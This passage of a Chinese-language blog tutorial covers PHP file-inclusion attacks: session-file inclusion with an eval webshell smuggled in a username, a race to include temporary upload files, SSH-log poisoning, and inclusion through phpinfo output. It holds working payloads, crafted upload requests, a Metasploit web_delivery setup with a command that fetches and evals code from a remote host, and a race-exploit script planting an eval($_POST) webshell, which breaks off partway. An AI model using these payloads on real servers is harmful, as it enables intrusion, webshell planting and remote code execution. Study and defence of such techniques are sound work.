invoke__\">execute</span>();</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">store_result</span>();</span><br><span class=\"line\">    <span class=\"variable\">$count</span> = <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">num_rows</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$count</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;User name Already Exists&#x27;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into user(username, password) values(?,?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;ss&quot;</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>两个文件都是用 PDO 写的，不存在 sql 注入，config 是数据库用户名与密码，除非他的服务器允许外链，不然没用，index 就包含了两个页面</p>\n<p>但我们注意到：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$res_password</span> == <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$username</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;location:index.php&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid user name or password&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里使用了 session 来保存用户会话，php 手册中是这样描述的：</p>\n<ol>\n<li>PHP 会将会话中的数据设置到  <code>$_SESSION</code>  变量中。</li>\n<li>当 PHP 停止的时候，它会自动读取  <code>$_SESSION</code>  中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>\n<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>\n</ol>\n</blockquote>\n<p>把我们的用户名 base64 编码后放到了 session 中</p>\n<p>那么可能存在 session 包含了，session 包含的两个条件：1. 知道物理路径与 session 名称，物理路径我们是知道的，session 名称我们可以 f12 查看 2.session 可以写入并且被包含，这一点我们也是满足的</p>\n<p>这样我们可以注册的时候用户名写我们的 php 代码，然后通过 session 包含</p>\n<p>但 session 中是 base64 编码后的，不能直接包含，我们需要在包含前解码，php://filter 就是个很好的解码方法</p>\n<p>注册如下用户名： <code>hahaha</code> ，密码随便写，最终在数据库中的是： <code>username|s:12:&quot;xxxxxxx&quot;</code> xxx 为我们用户名的 base64 编码，12 是 base64 编码的长度</p>\n<p>但 base64 是有特性的他必须 8 位为一组，如果不够会把后面的字符抓过来，此时 <code>username|s:12:&quot;</code>  正好是 15 个字符，为了增加一个字符，我们需要扩展我们的用户名，让他 base64 之后为 100 字符以上，这样我们前 16 个字符被解码为乱码，我们的 php 被正确包含</p>\n<p>比如： <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php eval($_GET['aaaaaa']) ?&gt;</code></p>\n<p>然后解码，正确包含</p>\n<p><code>http://1.1.1.1/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;aaaaaa=phpinfo();</code></p>\n<p>防御 session：</p>\n<p>修改 session 默认路径和名称</p>\n<p>设置 session 文件夹权限</p>\n<h2 id=\"临时文件包含\"><a class=\"markdownIt-Anchor\" href=\"#临时文件包含\">#</a> 临时文件包含</h2>\n<p>当文件上传时，先存储到临时文件夹，在移动到网站目录下，我们可以通过竞争在删除之前包含，文件名通过通配符找到</p>\n<p>1. 先上传文件</p>\n<p>2. 通过 file 覆盖前一个文件，匹配临时文件</p>\n<p>3. 包含临时文件</p>\n<p>如果是自己的 phpstudy 默认是没有开启</p>\n<p>我们需要修改 upload_tmp_dir = “C:\\Windows\\Temp”</p>\n<p>然后利用文件上传产生的缓存文件进行命令执行，从而 getshell</p>\n<p>假设我们有一个前端页面可以上传文件，后端可以接收上传的文件并进行包含，那么我们就可以利用文件上传时上传到临时目录，在删除之前通过竞争包含</p>\n<p>我们需要解决几个问题：</p>\n<p>1. 如何找到我们的临时文件？</p>\n<p>通过 &gt;，在 Windows 中 &gt; 可以当做通配符使用，很巧，php 的临时文件长这样 php678u，那么我们可以这样匹配 php&gt;&gt;&gt;</p>\n<p>2. 即使我们访问到临时文件，他依然会删除，怎么解决？</p>\n<p>往他网站根目录下写 php 文件，即使我们的临时文件删除了，只要在删除之前包含了，那么我们在网站根目录下的文件就会生成</p>\n<p><code>&lt;?php fputs(fopen('E:\\phpstudy_pro\\www\\aaaaa.php','w'),'&lt;?php phpinfo(); ?&gt;'); ?&gt;</code></p>\n<p>3. 如何构造上传包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /xss_location/include/windows.php HTTP/1.1</span><br><span class=\"line\">Host: 172.16.60.64</span><br><span class=\"line\">Content-Length: 481</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://172.16.60.64</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://172.16.60.64/xss_location/include/windows.html</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=s3pod5ho262o336afdd8ljvkg7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php fputs(fopen(&#x27;E:\\phpstudy_pro\\www\\aaaaa.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo(); ?&gt;&#x27;); ?&gt;</span><br><span class=\"line\">yes</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\Temp\\php&lt;&lt;&lt;&lt;</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">upload</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw--</span><br></pre></td></tr></table></figure>\n<p>注意：下面几行是需要我们自己构造的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yes</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\Temp\\php&lt;&lt;&lt;&lt;</span><br></pre></td></tr></table></figure>\n<p>yes 的作用是包含成功后的提示符</p>\n<p>name=file 是为了覆盖上一个 name=file，然后匹配临时文件</p>\n<p>php&gt;&gt;&gt;&gt; 就是通配符了，上面解释过</p>\n<p>记得空行的问题，如果报错尝试删除或增加空行</p>\n<p>补充一下 windows 匹配</p>\n<blockquote>\n<p>DOS_STAR：即 &lt;，匹配 0 个以上的字符<br>\n DOS_QM：即 &gt;，匹配 1 个字符<br>\n DOS_DOT：即 &quot;，匹配点号</p>\n</blockquote>\n<p>如果他的 php.ini 下没有设置 upload 这个东西的路径并且还有；，也就是没有设置。</p>\n<p>那么我们也可以直接读取任意文件</p>\n<p>其实也没必要非得文件上传了，本来文件包含后就可以读取了</p>\n<p>临时文件包含条件：</p>\n<blockquote>\n<p>1.php.ini 中的 upload_tmp_dir 下必须有 C:/Windows/Temp 这个路径</p>\n<p>2. 得有写入的权限（这个默认应该都可以）</p>\n<p>3.$_REQUEST 得有，因为他是获取表单信息的一个数组，如果没有它，那么我们就不能进行文件上传来打。</p>\n</blockquote>\n<h2 id=\"ssh文件包含\"><a class=\"markdownIt-Anchor\" href=\"#ssh文件包含\">#</a> SSH 文件包含</h2>\n<p>假设有如下文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];   </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))   &#123;       </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;<span class=\"subst\">$file</span>&quot;</span>);   </span><br><span class=\"line\">    &#125;   <span class=\"keyword\">else</span>   &#123;       </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;index.php&quot;</span>);   </span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>那么我们就可以包含任意文件，比如 /etc/passwd</p>\n<p><code>[101.35.139.208:9999/lfi.php?file=file:///etc/passwd](http://101.35.139.208:9999/lfi.php?file=file:///etc/passwd)</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191034602.png\" alt=\"image-20221031191034602\"></p>\n<p>那么意味着我们其实也可以包含 ssh log</p>\n<p>先看一眼 ssh log 里面有啥</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191351374.png\" alt=\"image-20221031191351374\"></p>\n<p>加入我们登录时构造这样的用户名 <code>ssh root&lt;?php phpinfo();?&gt;@101.35.139.208</code></p>\n<p>那么在我们的 ssh log 中就会存在以下日志</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191502317.png\" alt=\"image-20221031191502317\"></p>\n<p>试着包含一下？</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191635298.png\" alt=\"image-20221031191635298\"></p>\n<p>但是文件很大，你忍一下</p>\n<p>记得在包含前，设置文件的权限 <code>chmod 775 secure</code></p>\n<p>也可以写马，比如</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192425893.png\" alt=\"image-20221031192425893\"></p>\n<p>如果报错 <code>system() has been disabled for security reasons </code> ，无法包含，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192854594.png\" alt=\"image-20221031192854594\"></p>\n<p>把这里的 disable_function 中的你需要使用的函数去掉，重启</p>\n<p><code>service php-fpm restart</code></p>\n<p>web 传递  cs msf</p>\n<p>msf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\">msf exploit (web_delivery)&gt;set target 1</span><br><span class=\"line\">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class=\"line\">msf exploit (web_delivery)&gt; set lhost 192.168.1.123</span><br><span class=\"line\">msf exploit (web_delivery)&gt;set srvport 8081</span><br><span class=\"line\">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>\n<p>执行 msf 给出的命令</p>\n<p><code>http://10.128.50.84:18888/lfi.php?file=./shabi.php&amp;cmd=php -d allow_url_fopen=true -r &quot;eval(file_get_contents('http://192.168.13.133:9891/GEZgpb8cVDe', false, stream_context_create(['ssl'=&gt;['verify_peer'=&gt;false,'verify_peer_name'=&gt;false]])));&quot;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031201754444.png\" alt=\"image-20221031201754444\"></p>\n<p>CS web delivery</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101145322747.png\" alt=\"image-20221101145322747\" style=\"zoom:80%;\" />\n<h2 id=\"包含procselfenviron\"><a class=\"markdownIt-Anchor\" href=\"#包含procselfenviron\">#</a> 包含 / PROC/SELF/ENVIRON</h2>\n<p>并不能包含这东西～</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# ls -al /proc/self/environ </span><br><span class=\"line\">-r-------- 1 root root 0 Nov  1 14:56 /proc/self/environ</span><br></pre></td></tr></table></figure>\n<p>而且不能 chmod 改变权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# chmod 755 /proc/self/environ </span><br><span class=\"line\">chmod: changing permissions of ‘/proc/self/environ’: Operation not permitted</span><br></pre></td></tr></table></figure>\n<p>也不能修改特殊权限位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# lsattr /proc/self/environ </span><br><span class=\"line\">lsattr: Inappropriate ioctl for device While reading flags on /proc/self/environ</span><br></pre></td></tr></table></figure>\n<p>关于 chattr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos lighthouse]# chattr +i 11111.exe </span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br><span class=\"line\">rm: cannot remove ‘11111.exe’: Operation not permitted</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# lsattr 11111.exe </span><br><span class=\"line\">----i--------e-- 11111.exe</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# chattr -i 11111.exe</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br></pre></td></tr></table></figure>\n<h2 id=\"phpinfo文件包含\"><a class=\"markdownIt-Anchor\" href=\"#phpinfo文件包含\">#</a> phpinfo 文件包含</h2>\n<p>php 5.x</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Configuration File (php.ini) Path\tC:\\Windows</span><br><span class=\"line\">Loaded Configuration File\tD:\\BtSoft\\php\\54\\php.ini</span><br><span class=\"line\">PHP Version\t5.4.45</span><br><span class=\"line\">allow_url_fopen\tOn\tOn</span><br><span class=\"line\">allow_url_include\tOn\tOn</span><br><span class=\"line\">session.save_path\tD:\\BtSoft\\temp\\session\tD:\\BtSoft\\temp\\session</span><br><span class=\"line\">disable_functions\tno value\tno value</span><br><span class=\"line\">_SERVER[&quot;*********&quot;]\tC:\\Windows</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9waHBpbmZvLnBocA==\">http://127.0.0.1:18888/phpinfo.php</span> 我们可以向 phpinfo 中 post 参数，虽然没有接收，但会生成临时文件，我们可以利用时间竞争包含</p>\n<p>当然可以向任意 php 文件 post 文件，服务器都会将他保存到一个临时文件中，只是如果没有 phpinfo，临时文件名很难猜。然而 phpinfo 中会有文件名和路径的输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  <span class=\"string\">&#x27;file&#x27;</span>: <span class=\"string\">&quot;&lt;?php echo &#x27;yanchuang is cool!&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://172.16.60.64/xss_location/include/phpinfo.php&quot;</span></span><br><span class=\"line\">r = requests.post(url=url, files=files, allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">data = re.search(<span class=\"string\">&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;</span>, r.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br></pre></td></tr></table></figure>\n<p>为了延缓删除临时文件，我们需要 post 更长的文件，通知启用大量线程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup</span>(<span class=\"params\">host, port</span>):</span><br><span class=\"line\">    TAG = <span class=\"string\">&quot;Security Test&quot;</span></span><br><span class=\"line\">    PAYLOAD = <span class=\"string\">&quot;&quot;&quot;%s\\r</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php fputs(fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[a]);&#x27;)?&gt;\\r&quot;&quot;&quot;</span> % TAG</span><br><span class=\"line\">    REQ1_DATA = <span class=\"string\">&quot;&quot;&quot;-----------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: text/plain\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class=\"line\">    padding = <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">5000</span></span><br><span class=\"line\">    REQ1 = <span class=\"string\">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot; HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_USER_AGENT: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PRAGMA: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s&quot;&quot;&quot;</span> % (<span class=\"built_in\">len</span>(REQ1_DATA), host, REQ1_DATA)</span><br><span class=\"line\">    <span class=\"comment\"># modify this to suit the LFI script</span></span><br><span class=\"line\">    LFIREQ = <span class=\"string\">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\r</span></span><br><span 